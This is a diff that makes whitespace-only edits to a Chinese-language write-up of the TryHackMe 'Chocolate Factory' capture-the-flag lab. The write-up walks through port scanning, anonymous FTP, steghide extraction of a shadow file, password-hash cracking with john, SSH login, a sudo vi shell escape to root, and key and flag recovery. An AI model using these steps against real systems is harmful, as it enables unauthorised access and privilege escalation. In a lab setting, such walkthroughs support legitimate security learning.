@@ -1,7 +1,7 @@
-#服务发现
+# 服务发现
 ```
 ┌──(root💀kali)-[~/tryhackme/ChocolateFactory]
-└─# nmap -sV -Pn 10.10.164.40 -p-
+└─#  nmap -sV -Pn 10.10.164.40 -p-
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-29 22:47 EDT
 Nmap scan report for 10.10.164.40
@@ -41,10 +41,10 @@ PORT    STATE SERVICE     VERSION
 
 ```
 
-#目录爆破无发现
+# 目录爆破无发现
 ```
 ┌──(root💀kali)-[~/dirsearch]
-└─# python3 dirsearch.py -e* -t 100 -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -u http://10.10.164.40
+└─#  python3 dirsearch.py -e* -t 100 -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -u http://10.10.164.40
 
  _|. _ _  _  _  _ _|_    v0.3.8
 (_||| _) (/_(_|| (_| )
@@ -63,10 +63,10 @@ Task Completed
 ```
 
 
-#ftp服务可以匿名登录，把里面的文件下载本地分析
+# ftp服务可以匿名登录，把里面的文件下载本地分析
 ```
 ┌──(root💀kali)-[~/tryhackme/ChocolateFactory]
-└─# ftp 10.10.164.40
+└─#  ftp 10.10.164.40
 Connected to 10.10.164.40.
 220 (vsFTPd 3.0.3)
 Name (10.10.164.40:root): anonymous
@@ -93,16 +93,16 @@ ftp>
 用steghide分离jpg里的文件，得到一个```b64.txt```,其实就是base64的密文
 ```
 ┌──(root💀kali)-[~/tryhackme/ChocolateFactory]
-└─# steghide extract -sf gum_room.jpg 
+└─#  steghide extract -sf gum_room.jpg 
 Enter passphrase: 
 wrote extracted data to "b64.txt".
                                                                                                                                                                                                                                             
 ┌──(root💀kali)-[~/tryhackme/ChocolateFactory]
-└─# ls
+└─#  ls
 b64.txt  gum_room.jpg
                                                                                                                                                                                                                                             
 ┌──(root💀kali)-[~/tryhackme/ChocolateFactory]
-└─# cat b64.txt                  
+└─#  cat b64.txt                  
 ZGFlbW9uOio6MTgzODA6MDo5OTk5OTo3Ojo6CmJpbjoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXM6
 KjoxODM4MDowOjk5OTk5Ojc6OjoKc3luYzoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpnYW1lczoqOjE4
 MzgwOjA6OTk5OTk6Nzo6OgptYW46KjoxODM4MDowOjk5OTk5Ojc6OjoKbHA6KjoxODM4MDowOjk5
@@ -210,7 +210,7 @@ charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FO
 用john去破解
 ```
 ┌──(root💀kali)-[~/tryhackme/ChocolateFactory]
-└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt   
+└─#  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt   
 Using default input encoding: UTF-8
 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
 Cost 1 (iteration count) is 5000 for all loaded hashes
@@ -286,7 +286,7 @@ G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln
 把私钥保存成一个id_rsa文件，使用ssh登录charlie的账号，拿到user.txt
 ```
 ┌──(root💀kali)-[~/tryhackme/ChocolateFactory]
-└─# ssh -i id_rsa charlie@10.10.164.40
+└─#  ssh -i id_rsa charlie@10.10.164.40
 Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-115-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -346,11 +346,11 @@ User charlie may run the following commands on chocolate-factory:
 ```
 charlie@chocolate-factory:/$ sudo vi -c ':!/bin/sh' /dev/null
 
-# id
+#  id
 uid=0(root) gid=0(root) groups=0(root)
-# whoami
+#  whoami
 root
-# cat /root/root.txt
+#  cat /root/root.txt
 cat: /root/root.txt: No such file or directory
 
 ```
@@ -377,7 +377,7 @@ print(mess)
 
 用head查看文件头
 ```
-└─# head key_rev_key
+└─#  head key_rev_key
 ELF>�@�@8       @@@@�888�
 �
  hh/lib64/ld-linux-x86-64.so.2GNUGNU�s�ŗ5d�
@@ -385,7 +385,7 @@ tz�~������ ▒0MF�
  � � � � �      �  7"libc.so.6__isoc99_scanfputs__stack_chk_failprintf__cxa_finalizestrcmp__libc_start_mainGLIBC_2.7GLIBC_2.4GLIBC_2.2.5_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTableii
 ]��f.�]�@f.�H�= H�5 UH)�H��H��H��H��?H�H��t▒H� H��t�����%b       h������%Z       h������%R       h������%J       h������%b       f�1�I��^H��H���PTL�*H�
                                                    ]��f�]�@f.��= u/H�= UH��t
-����H���� ]����fDUH��]�f���UH��H��@�}�H�u�dH�%(H�E�1�H�=)������H�E�H��H�=#������H�E�H�5H���l�����u5H�=  s
+����H���� ]����fDUH��]�f���UH��H��@�}�H�u�dH�%(H�E�1�H�=)������H�E�H��H�=# ������H�E�H�5H���l�����u5H�=  s
  congratulations you have found the key:   b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
  Keep its safeBad name!8����������
                                   ���T���������L���,zRx
@@ -399,10 +399,10 @@ tz�~������ ▒0MF�
 
 所以key是：```b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='```
 
-#拿到root flag
+# 拿到root flag
 
 ```
-# python root.py
+#  python root.py
 Enter the key:  b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
 __   __               _               _   _                 _____ _          
 \ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
@@ -431,5 +431,5 @@ __   __               _               _   _                 _____ _
                               |___/  
 
 flag{cec59161d338fef787fcb4e296b42124}
-# 
+#  
 ```
